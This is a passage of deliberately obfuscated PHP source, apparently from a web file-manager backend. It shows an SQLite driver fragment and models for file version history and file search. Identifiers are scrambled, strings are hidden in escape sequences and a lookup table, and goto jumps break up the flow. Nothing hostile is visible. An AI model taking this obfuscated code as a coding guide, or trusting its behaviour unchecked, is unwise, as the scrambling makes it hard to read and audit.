$Û¯‡ÀŸ[57]); $ »Í÷ı¾ = array(); foreach ($“ı¢¹×Â as $ïÇ¿ƒ‡¸ => $´õøÇŸ“) { $ »Í÷ı¾[$ïÇ¿ƒ‡¸] = current($´õøÇŸ“); } return $ »Í÷ı¾; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ô ¸¤ì¡ =& $_SERVER[ŒÅŸ‹ä†]; $è´®‹ì = sqlite_last_error($this->_linkID); $this->error = $è´®‹ì . $Ô ¸¤ì¡[4] . sqlite_error_string($è´®‹ì); if ($Ô ¸¤ì¡[12] != $this->queryStr) { $this->error .= LNG($Ô ¸¤ì¡[58]) . $this->queryStr; } think_trace($this->error, $Ô ¸¤ì¡[12], $Ô ¸¤ì¡[59]); return $this->error; } public function escapeString($îÆğ†ÅÔ) { return sqlite_escape_string($îÆğ†ÅÔ); } public function parseLimit($Â±›¤¼) { $¸’Ñ—´ı =& $_SERVER[ŒÅŸ‹ä†]; $£ßá¶áÖ = $¸’Ñ—´ı[12]; if (!empty($Â±›¤¼)) { $Â±›¤¼ = explode($¸’Ñ—´ı[60], $Â±›¤¼); if (count($Â±›¤¼) > 1) { $£ßá¶áÖ .= $¸’Ñ—´ı[61] . $Â±›¤¼[1] . $¸’Ñ—´ı[62] . $Â±›¤¼[0] . $¸’Ñ—´ı[63]; } else { $£ßá¶áÖ .= $¸’Ñ—´ı[61] . $Â±›¤¼[0] . $¸’Ñ—´ı[63]; } } return $£ßá¶áÖ; } } goto Aå÷°ĞòË‚; cä‹…”´™í: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\x65\x5f\x68\151\163\x74\x6f\162\171"; public function historyCount($š¾í·«³) { $æßÚÍô =& $_SERVER[ŒÅŸ‹ä†]; if (!$š¾í·«³) { return array(); } if (is_string($š¾í·«³) || is_int($š¾í·«³)) { $š¾í·«³ = array($š¾í·«³); } $™’Ë²‚Š = array($æßÚÍô[202], $æßÚÍô[2377] => $æßÚÍô[590]); $Ö³Çìã = array($æßÚÍô[202] => array($æßÚÍô[7], $š¾í·«³)); $ÕºËİ = $this->field($™’Ë²‚Š)->where($Ö³Çìã)->group($æßÚÍô[202])->select(); return array_to_keyvalue($ÕºËİ, $æßÚÍô[202], $æßÚÍô[590]); } public function addHistory($­¹Óü¨ï, $Â™æµğŒ = '') { $‹—í¦‰ş =& $_SERVER[ŒÅŸ‹ä†]; $Ò‘‚îé = array($‹—í¦‰ş[511] => $­¹Óü¨ï[$‹—í¦‰ş[202]], $‹—í¦‰ş[1911] => isset($­¹Óü¨ï[$‹—í¦‰ş[548]]) ? $­¹Óü¨ï[$‹—í¦‰ş[548]] : $­¹Óü¨ï[$‹—í¦‰ş[546]], $‹—í¦‰ş[563] => $­¹Óü¨ï[$‹—í¦‰ş[562]], $‹—í¦‰ş[645] => $­¹Óü¨ï[$‹—í¦‰ş[89]], $‹—í¦‰ş[2378] => $Â™æµğŒ); if ($GLOBALS[$‹—í¦‰ş[6]][$‹—í¦‰ş[102]][$‹—í¦‰ş[1349]] >= 1) { $this->historyAutoClear($Ò‘‚îé[$‹—í¦‰ş[202]]); $this->add($Ò‘‚îé); } Hook::trigger($‹—í¦‰ş[2379], $Ò‘‚îé); Model($‹—í¦‰ş[2380])->eventFileEdit($­¹Óü¨ï[$‹—í¦‰ş[202]]); } private function historyAutoClear($îÂ÷ôã‘) { $ÑÓœÜõ =& $_SERVER[ŒÅŸ‹ä†]; $ éó”¥„ = Model($ÑÓœÜõ[869])->get($ÑÓœÜõ[1371]); $Ì™€ì¢ = intval($GLOBALS[$ÑÓœÜõ[6]][$ÑÓœÜõ[102]][$ÑÓœÜõ[1349]]); $Õ¡¤’ˆ = $ éó”¥„ == $ÑÓœÜõ[1372] ? min(5, $Ì™€ì¢) : $Ì™€ì¢; $Õ¡¤’ˆ = $Õ¡¤’ˆ <= 0 ? 0 : $Õ¡¤’ˆ - 1; if ($Õ¡¤’ˆ >= 499) { return; } $‘º©Ûøá = array($ÑÓœÜõ[511] => $îÂ÷ôã‘); $¹¡÷å— = $this->field($ÑÓœÜõ[2381])->where($‘º©Ûøá)->order($ÑÓœÜõ[2374])->select(); if (!$¹¡÷å— || $Õ¡¤’ˆ >= count($¹¡÷å—)) { return; } $±Â–ÒîÑ = array_to_keyvalue($¹¡÷å—, $ÑÓœÜõ[12], $ÑÓœÜõ[492]); $±Â–ÒîÑ = array_slice($±Â–ÒîÑ, $Õ¡¤’ˆ); $ø¤‰…·‰ = array_to_keyvalue($¹¡÷å—, $ÑÓœÜõ[12], $ÑÓœÜõ[562]); $ø¤‰…·‰ = array_slice($ø¤‰…·‰, $Õ¡¤’ˆ); if (!$±Â–ÒîÑ || !$ø¤‰…·‰) { return; } $‘º©Ûøá = array($ÑÓœÜõ[513] => array($ÑÓœÜõ[7], $±Â–ÒîÑ)); $this->where($‘º©Ûøá)->delete(); Model($ÑÓœÜõ[565])->remove($ø¤‰…·‰); } public function listData($å×Ù÷ú¾) { $„¦•ãğ =& $_SERVER[ŒÅŸ‹ä†]; $Ù²í‡ªË = array($„¦•ãğ[511] => $å×Ù÷ú¾); $šúƒ©Âç = $„¦•ãğ[2382]; $°ÍÌïÛ = $this->field($šúƒ©Âç)->where($Ù²í‡ªË)->order($„¦•ãğ[2374])->selectPage(); $this->_listAppendUser($°ÍÌïÛ[$„¦•ãğ[455]]); $á˜òŠĞ´ = Model($„¦•ãğ[869])->get($„¦•ãğ[1371]); $¤×à—›º = 5; if ($á˜òŠĞ´ == $„¦•ãğ[1372]) { $°ÍÌïÛ[$„¦•ãğ[455]] = array_slice($°ÍÌïÛ[$„¦•ãğ[455]], 0, $¤×à—›º); $°ÍÌïÛ[$„¦•ãğ[452]] = array($„¦•ãğ[2383] => 1, $„¦•ãğ[2384] => 20, $„¦•ãğ[2385] => 1, $„¦•ãğ[2386] => count($°ÍÌïÛ[$„¦•ãğ[455]])); } return $°ÍÌïÛ; } protected function _listAppendUser(&$ĞüïØ»Û) { $íãâùÊ” =& $_SERVER[ŒÅŸ‹ä†]; $ãöõ½ñç = array_to_keyvalue($ĞüïØ»Û, $íãâùÊ”[12], $íãâùÊ”[1537]); $ÇÇ™û€› = Model($íãâùÊ”[622])->userListInfo($ãöõ½ñç); foreach ($ĞüïØ»Û as &$ªš¬€ÇÓ) { $˜¡ÊŒ¢ = $ªš¬€ÇÓ[$íãâùÊ”[1537]]; $ªš¬€ÇÓ[$íãâùÊ”[546]] = $ÇÇ™û€›[$˜¡ÊŒ¢] ? $ÇÇ™û€›[$˜¡ÊŒ¢] : !1; } unset($ªš¬€ÇÓ); } public function fileInfo($ôÆÛŸÎÆ, $Ããï·×É = false) { $÷½ãŒ± =& $_SERVER[ŒÅŸ‹ä†]; $‘²½ş×º = $this->tablePrefix; $±Ú ‡ = "{$‘²½ş×º}\x69\157\x5f\146\151\154\145\x20\146\x69\154\145\x73\x20\157\156\x20\146\151\x6c\145\x73\x2e\146\x69\154\x65\x49\104\40\x3d\x20\x68\x69\163\164\x6f\162\x79\x2e\146\x69\154\145\111\x44"; $ö—ÁÒŒá = $this->alias($÷½ãŒ±[2387])->where(array($÷½ãŒ±[513] => $ôÆÛŸÎÆ))->join($±Ú ‡, $÷½ãŒ±[2388])->find(); if ($ö—ÁÒŒá && $Ããï·×É) { $ÌÃŠû¶ = array($÷½ãŒ±[202] => $ö—ÁÒŒá[$÷½ãŒ±[202]], $÷½ãŒ±[492] => array($÷½ãŒ±[1124], $ôÆÛŸÎÆ)); $ö—ÁÒŒá[$÷½ãŒ±[1807]] = $this->where($ÌÃŠû¶)->count(); } return $ö—ÁÒŒá; } public function removeItem($êÄÅİù™) { $åöşüÉ¹ =& $_SERVER[ŒÅŸ‹ä†]; $ú®¼Ëèã = array($åöşüÉ¹[513] => $êÄÅİù™); $Á“¿ÆÂÆ = $this->where($ú®¼Ëèã)->find(); if ($Á“¿ÆÂÆ) { $”áñÓŸÛ = $this->where($ú®¼Ëèã)->delete(); Model($åöşüÉ¹[565])->remove($Á“¿ÆÂÆ[$åöşüÉ¹[562]]); return $”áñÓŸÛ; } return !1; } public function removeBySource($âÈ®ºÓâ) { $ØÒÈœÙ =& $_SERVER[ŒÅŸ‹ä†]; if (!$âÈ®ºÓâ) { return !1; } if (!is_array($âÈ®ºÓâ)) { $âÈ®ºÓâ = array($âÈ®ºÓâ); } $’ŸïÊ· = array($ØÒÈœÙ[511] => array($ØÒÈœÙ[7], $âÈ®ºÓâ)); $ƒ³İÌ…Â = $this->field($ØÒÈœÙ[563])->where($’ŸïÊ·)->select(); if ($ƒ³İÌ…Â) { $this->where($’ŸïÊ·)->delete(); $ƒ‡ü±öÓ = array_to_keyvalue($ƒ³İÌ…Â, $ØÒÈœÙ[12], $ØÒÈœÙ[562]); Model($ØÒÈœÙ[565])->remove($ƒ‡ü±öÓ); } return !0; } public function setDetail($òÆŠëÊ¤, $İáÍ•‘Û) { $Š¼ÍëÃê =& $_SERVER[ŒÅŸ‹ä†]; return $this->where(array($Š¼ÍëÃê[513] => $òÆŠëÊ¤))->save(array($Š¼ÍëÃê[2378] => $İáÍ•‘Û)); } public function rollbackToItem($‘ÚÌåù, $ş«‰×Ã°) { $öâÜ°„† =& $_SERVER[ŒÅŸ‹ä†]; $ˆè­Ó–í = Model($öâÜ°„†[929])->sourceInfo($‘ÚÌåù); $this->addHistory($ˆè­Ó–í, LNG($öâÜ°„†[2389])); $šèôÉø× = $this->find($ş«‰×Ã°); $ıÊ²›Á = array($öâÜ°„†[562] => $šèôÉø×[$öâÜ°„†[562]], $öâÜ°„†[89] => $šèôÉø×[$öâÜ°„†[89]], $öâÜ°„†[98] => time(), $öâÜ°„†[548] => USER_ID); Model($öâÜ°„†[929])->where(array($öâÜ°„†[202] => $‘ÚÌåù))->save($ıÊ²›Á); return $this->where(array($öâÜ°„†[513] => $ş«‰×Ã°))->delete(); } public function clearSame($‡ùë•«”) { $øƒô¦ú =& $_SERVER[ŒÅŸ‹ä†]; $’Ê¶ˆÇ = $this->listData($‡ùë•«”); $½‚ååÇ• = array_to_keyvalue_group($’Ê¶ˆÇ, $øƒô¦ú[562]); $¯à³ÎÚ† = array(); $÷¼è‰Í = array(); foreach ($½‚ååÇ• as $ó“…•Ù“) { if (!$ó“…•Ù“ || count($ó“…•Ù“) <= 1) { continue; } foreach ($ó“…•Ù“ as $¤ÜË´ÄĞ) { $¯à³ÎÚ†[] = $¤ÜË´ÄĞ[$øƒô¦ú[562]]; $÷¼è‰Í[] = $¤ÜË´ÄĞ[$øƒô¦ú[492]]; } } if (!$÷¼è‰Í) { return; } $this->where(array($øƒô¦ú[492] => array($øƒô¦ú[7], $÷¼è‰Í)))->delete(); Model($øƒô¦ú[565])->remove($¯à³ÎÚ†); } public function userSpace() { $ãÎ´¹‚è =& $_SERVER[ŒÅŸ‹ä†]; $úñ£¶‚ = $this->tablePrefix; $ëú‹¿‘™ = array($ãÎ´¹‚è[1911] => USER_ID); $«ì„ï£ = "{$úñ£¶‚}\151\x6f\x5f\146\151\x6c\145\x20\146\151\x6c\x65\163\40\x6f\156\x20\x66\151\154\145\x73\56\x66\x69\154\145\111\104\40\75\x20\x68\x69\163\164\x6f\162\x79\x2e\x66\x69\154\145\x49\104"; return $this->alias($ãÎ´¹‚è[2387])->where($ëú‹¿‘™)->join($«ì„ï£, $ãÎ´¹‚è[2388])->sum($ãÎ´¹‚è[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¸Û¾²’») { $õ÷ÌÊˆ =& $_SERVER[ŒÅŸ‹ä†]; $š×¹£ğ = KodIO::fileTypeList(); $ù±ÕãÚÊ = $š×¹£ğ[$¸Û¾²’»]; if (!$ù±ÕãÚÊ) { return array(); } $ú¿Ë£ñÖ = $ù±ÕãÚÊ[$õ÷ÌÊˆ[177]]; $ç¶‡Ç…¢ = $õ÷ÌÊˆ[7]; if (!$ù±ÕãÚÊ[$õ÷ÌÊˆ[177]]) { $ãæÜÜªµ = array_to_keyvalue($š×¹£ğ, $õ÷ÌÊˆ[12], $õ÷ÌÊˆ[177]); $ú¿Ë£ñÖ = implode($õ÷ÌÊˆ[60], $ãæÜÜªµ); $ç¶‡Ç…¢ = $õ÷ÌÊˆ[2390]; } $—¬õØí = explode($õ÷ÌÊˆ[60], trim($ú¿Ë£ñÖ, $õ÷ÌÊˆ[60])); return array($ç¶‡Ç…¢, $—¬õØí); } public function listPathType($ƒ½í¹¥à) { $ÑÂÍˆÆ =& $_SERVER[ŒÅŸ‹ä†]; $Â¬ºõ™ª = $this->fileTypeWhere($ƒ½í¹¥à); if (!$Â¬ºõ™ª) { return array(); } $¨öÏ¡ğ° = USER_ID; $ı§Õå¹ = Model($ÑÂÍˆÆ[622])->getInfo($¨öÏ¡ğ°); $ÏğÌÌ½ß = array($ÑÂÍˆÆ[676] => SourceModel::TYPE_USER, $ÑÂÍˆÆ[609] => array($ÑÂÍˆÆ[640], $ÑÂÍˆÆ[618] . $ı§Õå¹[$ÑÂÍˆÆ[100]][$ÑÂÍˆÆ[202]] . $ÑÂÍˆÆ[641]), $ÑÂÍˆÆ[677] => $¨öÏ¡ğ°, $ÑÂÍˆÆ[674] => 0, $ÑÂÍˆÆ[675] => $Â¬ºõ™ª); return $this->listSource($ÏğÌÌ½ß); } public function listSearch($‹ïÎ…Ó, $ë¶Áº€³ = 300) { $ª¡Ë‡è‹ =& $_SERVER[ŒÅŸ‹ä†]; if (isset($‹ïÎ…Ó[$ª¡Ë‡è‹[2222]]) && $‹ïÎ…Ó[$ª¡Ë‡è‹[2222]]) { $‹ïÎ…Ó[$ª¡Ë‡è‹[2222]] = str_replace($ª¡Ë‡è‹[480], $ª¡Ë‡è‹[2391], trim($‹ïÎ…Ó[$ª¡Ë‡è‹[2222]])); } $ÎÔØ‰×æ = $this->_parseSearchWhere($‹ïÎ…Ó); if (!isset($ÎÔØ‰×æ[$ª¡Ë‡è‹[525]])) { $ÎÔØ‰×æ[$ª¡Ë‡è‹[525]] = 0; } $Ìèè£î— = $ª¡Ë‡è‹[2392]; $æÆñÂ— = $ÎÔØ‰×æ; $·¨ê®î = $Ìèè£î—; $this->_listSearchBindPinyin($‹ïÎ…Ó, $ÎÔØ‰×æ, $Ìèè£î—); $this->alias($ª¡Ë‡è‹[538])->_makeOrder(); $ÎÔØ‰×æ = $this->parseWhereLike($ÎÔØ‰×æ); $Œ˜Î¯£Í = $this->distinct(!0)->field($Ìèè£î—)->where($ÎÔØ‰×æ)->selectPage($ë¶Áº€³); if ($GLOBALS[$ª¡Ë‡è‹[6]][$ª¡Ë‡è‹[477]][$ª¡Ë‡è‹[478]] && Input::check($‹ïÎ…Ó[$ª¡Ë‡è‹[2222]], $ª¡Ë‡è‹[683]) && $Œ˜Î¯£Í[$ª¡Ë‡è‹[452]][$ª¡Ë‡è‹[438]] == 1 && $Œ˜Î¯£Í[$ª¡Ë‡è‹[452]][$ª¡Ë‡è‹[453]] == 0) { $Œ˜Î¯£Í = $this->distinct(!0)->field($Ìèè£î—)->where($æÆñÂ—)->limit(1000)->select(); $Œ˜Î¯£Í = array_page_split($Œ˜Î¯£Í, !1, $ë¶Áº€³); } $this->_listSearchFileContent($Œ˜Î¯£Í, $‹ïÎ…Ó, $·¨ê®î, $æÆñÂ—); $this->_listSearchDesc($Œ˜Î¯£Í, $‹ïÎ…Ó, $·¨ê®î); $this->_listSearchTag($Œ˜Î¯£Í, $‹ïÎ…Ó, $·¨ê®î); $this->_listSearchGroupTag($Œ˜Î¯£Í, $‹ïÎ…Ó, $·¨ê®î); $this->_listDataApply($Œ˜Î¯£Í[$ª¡Ë‡è‹[455]]); $this->_listMake($Œ˜Î¯£Í); return $Œ˜Î¯£Í; } private function _listSearchFileContent(&$²¼•„ô, $¡ªüÖ£”, $Øë¹Ç›, $‰ü‡Áƒ) { $ëİçŠô˜ =& $_SERVER[ŒÅŸ‹ä†]; if (!$¡ªüÖ£”[$ëİçŠô˜[2222]] || $²¼•„ô[$ëİçŠô˜[452]][$ëİçŠô˜[438]] > 1) { return; } if (!isset($‰ü‡Áƒ[$ëİçŠô˜[42]]) || !is_array($¡ªüÖ£”[$ëİçŠô˜[562]])) { return; } $‰ü‡Áƒ[$ëİçŠô˜[562]] = array($ëİçŠô˜[7], $¡ªüÖ£”[$ëİçŠô˜[562]]); unset($‰ü‡Áƒ[$ëİçŠô˜[42]]); unset($¡ªüÖ£”[$ëİçŠô˜[562]]); $ı¢‰àªà = $this->field($Øë¹Ç›)->where($‰ü‡Áƒ)->limit($ëİçŠô˜[2393])->select(); if (!$ı¢‰àªà || count($ı¢‰àªà) == 0) { return; } $²¼•„ô[$ëİçŠô˜[455]] = array_merge($ı¢‰àªà, $²¼•„ô[$ëİçŠô˜[455]]); $²¼•„ô[$ëİçŠô˜[452]][$ëİçŠô˜[453]] += count($ı¢‰àªà); } private function _listSearchTag(&$¹×œ‰­Ò, $ÍÈ¶íÀÂ, $Ùš¥Êœ¹) { $¦¨ş–à =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ÍÈ¶íÀÂ[$¦¨ş–à[2088]]) || !in_array($¦¨ş–à[2394], $ÍÈ¶íÀÂ[$¦¨ş–à[2088]])) { return; } if (!$ÍÈ¶íÀÂ[$¦¨ş–à[2222]] || $¹×œ‰­Ò[$¦¨ş–à[452]][$¦¨ş–à[438]] > 1) { return; } $Å÷“Òõ = Model($¦¨ş–à[2395])->listData(); $Î§€—²æ = array(); $àˆˆğÇ = $ÍÈ¶íÀÂ[$¦¨ş–à[2222]]; foreach ($Å÷“Òõ as $øˆÇÒœÃ) { $–©Œ¤æ™ = $øˆÇÒœÃ[$¦¨ş–à[42]]; $‘â¾òó = str_replace($¦¨ş–à[63], $¦¨ş–à[12], Pinyin::get($–©Œ¤æ™)); if (stripos($–©Œ¤æ™, $àˆˆğÇ) !== !1 || stripos($‘â¾òó, $àˆˆğÇ) !== !1) { $Î§€—²æ[] = $øˆÇÒœÃ[$¦¨ş–à[492]]; } } if (!$Î§€—²æ) { return; } $’Ôì¾Ò = array($¦¨ş–à[520] => array($¦¨ş–à[7], $Î§€—²æ), $¦¨ş–à[1537] => USER_ID); $ÓÆû™ó¦ = Model($¦¨ş–à[522])->field($¦¨ş–à[97])->where($’Ôì¾Ò)->select(); $ÓÆû™ó¦ = array_to_keyvalue($ÓÆû™ó¦, $¦¨ş–à[12], $¦¨ş–à[97]); $ûòé†™¯ = array_unique($ÓÆû™ó¦); $this->_listSearchMerge($¹×œ‰­Ò, $ÍÈ¶íÀÂ, $Ùš¥Êœ¹, $ûòé†™¯); } private function _listSearchDesc(&$Ù©»•³ˆ, $ÌÓóë¿Û, $€Ö€ê€›) { $şÊÊÚè¢ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ÌÓóë¿Û[$şÊÊÚè¢[2088]]) || !in_array($şÊÊÚè¢[545], $ÌÓóë¿Û[$şÊÊÚè¢[2088]])) { return; } if (!$ÌÓóë¿Û[$şÊÊÚè¢[2222]] || $Ù©»•³ˆ[$şÊÊÚè¢[452]][$şÊÊÚè¢[438]] > 1) { return; } $®¥Ìòí = array($şÊÊÚè¢[105] => $şÊÊÚè¢[545], $şÊÊÚè¢[460] => array($şÊÊÚè¢[479], $şÊÊÚè¢[2224] . $ÌÓóë¿Û[$şÊÊÚè¢[2222]] . $şÊÊÚè¢[2224])); $ëåî¾ÁÎ = !1; if ($ëåî¾ÁÎ) { $¬ú±ı²ß = $this->listSearchChildren($ÌÓóë¿Û[$şÊÊÚè¢[201]]); $¬ú±ı²ß = array_unique($¬ú±ı²ß); if (!$¬ú±ı²ß) { return; } $®¥Ìòí[$şÊÊÚè¢[202]] = array($şÊÊÚè¢[7], $¬ú±ı²ß); } $‹ŞŠ‡¡ö = Model($şÊÊÚè¢[660])->field($şÊÊÚè¢[202])->where($®¥Ìòí)->limit(5000)->select(); $Ô¸‡›Öå = array_to_keyvalue($‹ŞŠ‡¡ö, $şÊÊÚè¢[12], $şÊÊÚè¢[202]); $this->_listSearchMerge($Ù©»•³ˆ, $ÌÓóë¿Û, $€Ö€ê€›, $Ô¸‡›Öå); } private function _listSearchGroupTag(&$ÁƒÜÖÁÏ, $Ùúñı¦ã, $‹ö£–Ö) { $ƒ‰¢Ğ¼Ş =& $_SERVER[ŒÅŸ‹ä†]; if (empty($Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[2088]]) || !in_array($ƒ‰¢Ğ¼Ş[2394], $Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[2088]])) { return; } if (!$Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[2222]] || $ÁƒÜÖÁÏ[$ƒ‰¢Ğ¼Ş[452]][$ƒ‰¢Ğ¼Ş[438]] > 1 || !$Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[201]]) { return; } $î ²œŒş = $this->sourceInfo($Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[201]]); if (!$î ²œŒş || $î ²œŒş[$ƒ‰¢Ğ¼Ş[199]] != SourceModel::TYPE_GROUP) { return; } $İ¯º­¤Î = $î ²œŒş[$ƒ‰¢Ğ¼Ş[594]]; $‚êÜÀ½ = Model($ƒ‰¢Ğ¼Ş[2396])->get($İ¯º­¤Î); $áÆİ® = array(); $•ÒºÇéó = $Ùúñı¦ã[$ƒ‰¢Ğ¼Ş[2222]]; foreach ($‚êÜÀ½[$ƒ‰¢Ğ¼Ş[455]] as $¢æ¢Ô²Â) { $´õ ¿·ı = $¢æ¢Ô²Â[$ƒ‰¢Ğ¼Ş[42]]; $‡ùˆĞÆ = str_replace($ƒ‰¢Ğ¼Ş[63], $ƒ‰¢Ğ¼Ş[12], Pinyin::get($´õ ¿·ı)); if (stripos($´õ ¿·ı, $•ÒºÇéó) !== !1 || stripos($‡ùˆĞÆ, $•ÒºÇéó) !== !1) { $áÆİ®[] = $¢æ¢Ô²Â[$ƒ‰¢Ğ¼Ş[492]]; } } if (!$áÆİ®) { return; } $ÁØÚ¶Ÿ = array($ƒ‰¢Ğ¼Ş[520] => array($ƒ‰¢Ğ¼Ş[7], $áÆİ®), $ƒ‰¢Ğ¼Ş[1537] => 0, $ƒ‰¢Ğ¼Ş[43] => $ƒ‰¢Ğ¼Ş[1435] . $İ¯º­¤Î); $âËŸÛì = Model($ƒ‰¢Ğ¼Ş[522])->field($ƒ‰¢Ğ¼Ş[97])->where($ÁØÚ¶Ÿ)->select(); $âËŸÛì = array_to_keyvalue($âËŸÛì, $ƒ‰¢Ğ¼Ş[12], $ƒ‰¢Ğ¼Ş[97]); $±í•³Œğ = array_unique($âËŸÛì); $this->_listSearchMerge($ÁƒÜÖÁÏ, $Ùúñı¦ã, $‹ö£–Ö, $±í•³Œğ); } private function _listSearchMerge(&$Œ¿®£ÅÊ, $§êä·ø, $¿Ößş›, $›ä°ÏÅÎ) { $¡‹÷ ú =& $_SERVER[ŒÅŸ‹ä†]; if (!$›ä°ÏÅÎ) { return; } $¹¶ü¨® = array_to_keyvalue($Œ¿®£ÅÊ[$¡‹÷ ú[455]], $¡‹÷ ú[12], $¡‹÷ ú[202]); $Ïß‚‘¶¤ = array_diff($›ä°ÏÅÎ, $¹¶ü¨®); if (!$Ïß‚‘¶¤) { return; } $æŸ•Çš = array($¡‹÷ ú[202] => array($¡‹÷ ú[7], $Ïß‚‘¶¤)); $‰ú¢ğä = $this->field($¿Ößş›)->where($æŸ•Çš)->select(); if (!$‰ú¢ğä) { return; } $Êªü¹ù¶ = array(); foreach ($‰ú¢ğä as $‚È¼©í”) { if ($this->_listSearchFilter($‚È¼©í”, $§êä·ø)) { $Êªü¹ù¶[] = $‚È¼©í”; } } $Œ¿®£ÅÊ[$¡‹÷ ú[455]] = array_merge($Êªü¹ù¶, $Œ¿®£ÅÊ[$¡‹÷ ú[455]]); $Œ¿®£ÅÊ[$¡‹÷ ú[452]][$¡‹÷ ú[453]] += count($Êªü¹ù¶); } private function _listSearchFilter($Œ•Øœİ, $¼Ö‰•ŸÈ) { $¢şØùÃø =& $_SERVER[ŒÅŸ‹ä†]; $Ùß° ñ = $Œ•Øœİ[$¢şØùÃø[505]] == $¢şØùÃø[101]; if (!strstr($Œ•Øœİ[$¢şØùÃø[609]], $¢şØùÃø[60] . $¼Ö‰•ŸÈ[$¢şØùÃø[201]] . $¢şØùÃø[60])) { return !1; } if (isset($¼Ö‰•ŸÈ[$¢şØùÃø[506]]) && $¼Ö‰•ŸÈ[$¢şØùÃø[506]] != $¢şØùÃø[875]) { if ($¼Ö‰•ŸÈ[$¢şØùÃø[506]] == $¢şØùÃø[88] && !$Ùß° ñ) { return !1; } if ($¼Ö‰•ŸÈ[$¢şØùÃø[506]] != $¢şØùÃø[88] && $Ùß° ñ) { return !1; } if (!strstr($Œ•Øœİ[$¢şØùÃø[177]], $¢şØùÃø[60] . $¼Ö‰•ŸÈ[$¢şØùÃø[506]] . $¢şØùÃø[60])) { return !1; } } if (isset($¼Ö‰•ŸÈ[$¢şØùÃø[2397]]) && $¼Ö‰•ŸÈ[$¢şØùÃø[2397]] < $Œ•Øœİ[$¢şØùÃø[89]]) { return !1; } if (isset($¼Ö‰•ŸÈ[$¢şØùÃø[2398]]) && $¼Ö‰•ŸÈ[$¢şØùÃø[2398]] > $Œ•Øœİ[$¢şØùÃø[89]]) { return !1; } if (isset($¼Ö‰•ŸÈ[$¢şØùÃø[690]]) && $¼Ö‰•ŸÈ[$¢şØùÃø[690]] != $Œ•Øœİ[$¢şØùÃø[548]]) { return !1; } return !0; } public function listSearchChildren($Á‰²¶¦Ú, $ÄÀìø‘ = 5000) { $Ìö”¢–³ =& $_SERVER[ŒÅŸ‹ä†]; $òœÖ²ƒ¹ = array(); $£ëúÎéö = $this->sourceInfo($Á‰²¶¦Ú); $ó¼ÆÇÇğ = array($Ìö”¢–³[609] => array($Ìö”¢–³[479], $£ëúÎéö[$Ìö”¢–³[609]] . $£ëúÎéö[$Ìö”¢–³[202]] . $Ìö”¢–³[641])); $ıöÉšãœ = $this->field($Ìö”¢–³[89])->where($ó¼ÆÇÇğ)->limit($ÄÀìø‘ + 1)->select(); $Ç²€§ü = is_array($ıöÉšãœ) ? count($ıöÉšãœ) : 0; if ($Ç²€§ü > $ÄÀìø‘) { return $this->_listSearchChildrenNear($Á‰²¶¦Ú, $ÄÀìø‘); } $Š¢î»µğ = $this->field($Ìö”¢–³[202])->where($ó¼ÆÇÇğ)->select(); $òœÖ²ƒ¹ = array_to_keyvalue($Š¢î»µğ, $Ìö”¢–³[12], $Ìö”¢–³[202]); return $òœÖ²ƒ¹; } private function _listSearchChildrenNear($•Ú³Øœì, $íÏ…ªäá) { $ì‡„ê§ =& $_SERVER[ŒÅŸ‹ä†]; $ÚÍ†Ï« = array(); $Ó˜Í¦ƒ¿ = array($ì‡„ê§[201] => $•Ú³Øœì); $ñ²Ô¸ı¿ = $this->field($ì‡„ê§[2399])->where($Ó˜Í¦ƒ¿)->select(); $äú¥î = array_to_keyvalue(array_filter_by_field($ñ²Ô¸ı¿, $ì‡„ê§[505], $ì‡„ê§[101]), $ì‡„ê§[12], $ì‡„ê§[202]); $ÚÍ†Ï« = array_merge($ÚÍ†Ï«, array_to_keyvalue($ñ²Ô¸ı¿, $ì‡„ê§[12], $ì‡„ê§[202])); if (!$äú¥î) { return $ÚÍ†Ï«; } $Ó˜Í¦ƒ¿ = array($ì‡„ê§[201] => array($ì‡„ê§[7], $äú¥î)); $ñ²Ô¸ı¿ = $this->field($ì‡„ê§[2399])->where($Ó˜Í¦ƒ¿)->limit($íÏ…ªäá)->select(); $ÚÍ†Ï« = array_merge($ÚÍ†Ï«, array_to_keyvalue($ñ²Ô¸ı¿, $ì‡„ê§[12], $ì‡„ê§[202])); $ÚÍ†Ï« = array_slice($ÚÍ†Ï«, 0, intval($íÏ…ªäá)); return $ÚÍ†Ï«; } private function _listSearchBindPinyin($¨·’”à, &$°ù›Ï¶Ã, &$ˆ‚Ä¾â÷) { $ÒâÄ‰¨Ğ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($¨·’”à[$ÒâÄ‰¨Ğ[2222]]) || !$¨·’”à[$ÒâÄ‰¨Ğ[2222]]) { return; } if (!Input::check($¨·’”à[$ÒâÄ‰¨Ğ[2222]], $ÒâÄ‰¨Ğ[403]) || strlen($¨·’”à[$ÒâÄ‰¨Ğ[2222]]) < 2) { return; } $‚Ö½Ş£ô = "\114\x45\106\124\x20\112\117\111\x4e\40{$this->tablePrefix}\151\157\137\x73\x6f\x75\x72\x63\x65\x5f\155\145\x74\141\x20\x6d\145\164\x61\40\157\x6e\x20\163\157\165\x72\x63\x65\x2e\x73\157\x75\162\143\x65\111\x44\x20\x3d\40\x6d\145\x74\x61\56\x73\x6f\165\x72\143\145\x49\x44"; $¸÷£éò… = array(); $ˆ‚Ä¾â÷ = str_replace(array($ÒâÄ‰¨Ğ[18], $ÒâÄ‰¨Ğ[63], $ÒâÄ‰¨Ğ[2400]), $ÒâÄ‰¨Ğ[12], $ˆ‚Ä¾â÷); $ˆ‚Ä¾â÷ = $ÒâÄ‰¨Ğ[530] . str_replace($ÒâÄ‰¨Ğ[60], $ÒâÄ‰¨Ğ[531], $ˆ‚Ä¾â÷); $–Çí¼ = $°ù›Ï¶Ã[$ÒâÄ‰¨Ğ[42]]; unset($°ù›Ï¶Ã[$ÒâÄ‰¨Ğ[42]]); foreach ($°ù›Ï¶Ã as $»ÚïŞÃ» => $âƒë¡ª) { $¸÷£éò…[$ÒâÄ‰¨Ğ[530] . $»ÚïŞÃ»] = $âƒë¡ª; } foreach ($–Çí¼ as $Ÿ‰Ó«éÜ) { $¸÷£éò…[] = 